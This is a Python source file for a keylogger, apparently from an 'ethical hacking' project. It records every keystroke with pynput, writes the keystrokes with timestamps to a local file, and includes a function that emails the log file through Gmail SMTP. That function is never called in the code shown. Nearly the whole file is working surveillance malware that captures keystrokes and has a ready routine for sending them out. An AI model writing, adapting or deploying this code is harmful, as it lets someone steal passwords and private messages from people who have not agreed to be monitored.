import datetime
import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

# key logging variables including file path to log file
log_file = "key_presses.txt"
keys_pressed = "" 

def email_log_file(log_file):
    # Information needed to send it
    sender = os.environ["SENDER"]
    receiver = os.environ["RECEIVER"]
    password = os.environ["PASSWORD"]

    # Builds the message
    message = MIMEMultipart()
    message["from"] = sender
    message["to"] = receiver
    message["subject"] = "Log file from ethical hacking keylogger project"

    # Email body
    with open(log_file, "r") as f:
        body = f.read()
    
    message.attach(MIMEText(body))

    # connect to the email server to send the email
    try:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(sender, password)
        server.send_message(message)
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server.quit()

# Records key presses
def on_press(key):
    global keys_pressed
    try:
        keys_pressed += key.char  # regular key
        print(f"Key {key.char} pressed")
    except AttributeError:
        keys_pressed += f"[{key}]"  # special key
        print(f"Special key {key} pressed")

# Records released keys
def on_release(key):
    global keys_pressed
    
    # Only write if something was typed
    if keys_pressed:
        with open(log_file, "a") as f:
            f.write(f"{keys_pressed} at {datetime.datetime.now()}\n")
        keys_pressed = ""  # reset after writing
    
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

# Keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()